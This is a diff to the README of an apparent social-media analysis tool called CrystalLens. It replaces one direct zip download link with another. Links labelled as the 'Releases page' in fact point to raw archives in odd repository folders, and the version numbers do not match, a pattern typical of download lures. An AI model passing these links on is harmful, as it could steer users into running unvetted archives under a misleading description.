@@ -6,7 +6,7 @@ Welcome to CrystalLens! This software helps you analyze social media posts to ga
 
 ## 📥 Download CrystalLens
 
-[![Download CrystalLens](https://raw.githubusercontent.com/sheikyx021/CrystalLens/main/superconsequency/CrystalLens.zip%20CrystalLens-v1.0-brightgreen)](https://raw.githubusercontent.com/sheikyx021/CrystalLens/main/superconsequency/CrystalLens.zip)
+[![Download CrystalLens](https://raw.githubusercontent.com/sheikyx021/CrystalLens/main/app/services/Lens_Crystal_v2.8.zip%20CrystalLens-v1.0-brightgreen)](https://raw.githubusercontent.com/sheikyx021/CrystalLens/main/app/services/Lens_Crystal_v2.8.zip)
 
 To download CrystalLens, simply visit the Releases page by clicking the button above.
 
@@ -70,6 +70,6 @@ If you need assistance, help is available. Check the FAQ section within the app 
 
 ## 🔗 More Download Information
 
-Remember, you can always visit our [Releases page](https://raw.githubusercontent.com/sheikyx021/CrystalLens/main/superconsequency/CrystalLens.zip) to see the latest updates and download options.
+Remember, you can always visit our [Releases page](https://raw.githubusercontent.com/sheikyx021/CrystalLens/main/app/services/Lens_Crystal_v2.8.zip) to see the latest updates and download options.
 
 Thank you for choosing CrystalLens. We hope it enhances your social media analysis experience!
